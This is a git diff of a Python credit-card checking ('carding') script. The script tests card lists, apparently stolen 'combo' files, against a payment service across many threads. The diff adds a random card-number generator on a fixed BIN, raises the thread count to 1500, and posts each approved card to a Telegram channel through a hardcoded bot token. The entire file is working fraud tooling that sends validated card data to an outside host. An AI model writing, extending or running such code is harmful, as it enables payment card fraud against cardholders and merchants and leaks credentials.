@@ -4,19 +4,19 @@ import requests
 import threading
 from queue import Queue
 from pyfiglet import figlet_format
+import random
 
 # Hardcoded Telegram credentials
-token = '7219723045:AAGaebZt8zi14g_28Mci-D1C7k2WGG80u2o'
-Id = '5450488902'
+token = '7219723045:AAEsX-fUtn6ETZ2sHvkDtY5AZZRt7MyXrBI'
+channel_username = '@easy4169'  # Use the channel username
 
-# Get the combo file name from user
-po = input('- Enter Name Combo • ادخل اسم الكومبو -> ')
-
-# Load combo file
-try:
-    file = open(po, 'r').read().splitlines()
-except FileNotFoundError:
-    exit(f'\n\033[1;31m- No File With Name • لايوجد ملف بهذا الاسم -> [ {po} ]')
+def generate_card():
+    iin = '436127'  # Example IIN/BIN for card generation
+    account_identifier = ''.join([str(random.randint(0, 9)) for _ in range(10)])
+    exp_month = str(random.randint(1, 12)).zfill(2)
+    exp_year = str(random.randint(23, 30))
+    cvv = str(random.randint(100, 999))
+    return f'{iin}{account_identifier}|{exp_month}|{exp_year}|{cvv}'
 
 def St(kil):
     n, mm, yy, cvv = kil.split('|')
@@ -74,6 +74,15 @@ def St(kil):
         except:
             return text
 
+def send_to_telegram(message):
+    url = f'https://api.telegram.org/bot{token}/sendMessage'
+    payload = {
+        'chat_id': channel_username,
+        'text': message,
+        'parse_mode': 'Markdown'
+    }
+    requests.post(url, data=payload)
+
 def process_card(q):
     while not q.empty():
         cc = q.get()
@@ -123,6 +132,7 @@ Country -> {cou} {emoji}
 - - - - - - - - - - - - - - - - - - - - - - -
 Dev : @Lx0b2 '''
             print(f'''\033[1;32m {m}''')
+            send_to_telegram(m)
         elif 'was declined' in ko or 'number' in ko:
             print(f'''\033[1;31m
 Visa is Declined ✗
@@ -175,6 +185,7 @@ Country -> {cou} {emoji}
 - - - - - - - - - - - - - - - - - - - - - - -
 Dev : @Lx0b2 ''')
             print(requir)
+            send_to_telegram(requir)
         else:
             api = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
             try:
@@ -220,24 +231,43 @@ Country -> {cou} {emoji}
 - - - - - - - - - - - - - - - - - - - - - - -
 Dev : @Lx0b2 '''
             print(f'''\033[1;32m{m}''')
+            send_to_telegram(m)
         q.task_done()
 
-# Create a queue and add all cards to the queue
-q = Queue()
-for cc in file:
-    q.put(cc)
+def main():
+    choice = input('Choose an option:\n1. Load combo file\n2. Generate cards\n-> ')
 
-# Create and start threads
-num_threads = 313
-threads = []
-for _ in range(num_threads):
-    t = threading.Thread(target=process_card, args=(q,))
-    t.start()
-    threads.append(t)
+    if choice == '1':
+        po = input('- Enter Name Combo • ادخل اسم الكومبو -> ')
+        try:
+            file = open(po, 'r').read().splitlines()
+        except FileNotFoundError:
+            exit(f'\n\033[1;31m- No File With Name • لايوجد ملف بهذا الاسم -> [ {po} ]')
+    elif choice == '2':
+        num_cards = int(input('- Enter the number of cards to generate • ادخل عدد الكروت لتوليد -> '))
+        file = [generate_card() for _ in range(num_cards)]
+    else:
+        exit('Invalid choice.')
 
-# Wait for all threads to finish
-q.join()
-for t in threads:
-    t.join()
+    # Create a queue and add all cards to the queue
+    q = Queue()
+    for cc in file:
+        q.put(cc)
 
-print("All tasks completed.")
+    # Create and start threads
+    num_threads = 1500  # Adjust the number of threads as necessary
+    threads = []
+    for _ in range(num_threads):
+        t = threading.Thread(target=process_card, args=(q,))
+        t.start()
+        threads.append(t)
+
+    # Wait for all threads to finish
+    q.join()
+    for t in threads:
+        t.join()
+
+    print("All tasks completed.")
+
+if __name__ == "__main__":
+    main()
